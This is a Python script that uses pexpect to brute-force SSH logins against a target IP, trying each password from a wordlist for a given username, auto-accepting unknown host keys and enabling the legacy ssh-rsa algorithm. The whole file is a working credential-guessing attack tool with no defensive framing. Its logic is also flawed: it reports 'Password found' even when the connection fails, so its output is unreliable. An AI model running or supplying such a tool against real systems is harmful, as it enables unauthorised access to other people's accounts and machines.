import pexpect
import optparse
import sys
from misc import *

# add options 
parser = optparse.OptionParser()
parser.add_option('-i', dest='host', help="enter the target device's IP address")
parser.add_option('-u', dest='username', help="enter the username of the target device")
parser.add_option('-f', dest="file_location", help="enter password file location")
(options, arg) = parser.parse_args()

prompt = ['#', '>>>', '>', '\$ ']

# TODO: use regex to check for IP validity
if options.host == "":
    log_error("You must provide a host IP address")
    sys.exit(2)

if options.username == "":
    log_error("You must provide a username")
    sys.exit(2)

if options.file_location == "":
    log_error("You must provide a location to potential passwords")
    sys.exit(2)

def ssh(host, username, password):
    ssh_newkey = "Are you sure you want to continue connecting"
    ssh_connect_cmd = "ssh -v -oHostKeyAlgorithms=+ssh-rsa " + username + "@" + host
    child = pexpect.spawn(ssh_connect_cmd)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, "password"])
    if ret == 0:
        log_error(f"Failed to connect to {host}")
        return
    elif ret == 1:
        child.sendline("yes")
        ret = child.expect([pexpect.TIMEOUT, "[P|p]assword"])
        if ret == 0:
            log_error(f"Failed to connect to {host}")
            return
    
    child.sendline(password)
    child.expect(prompt, timeout=0.5)
    return child

file_location = options.file_location
file = open(file_location, 'r')
host = options.host
username = options.username
for password in file.readlines():
    try:
        password = password.strip('\n')
        child = ssh(host, username, password)
        log_info(f"Password found: {password}")
    except:
        log_error(f"Wrong password: {password}")
log_notice("All passwords provided has been attempted")


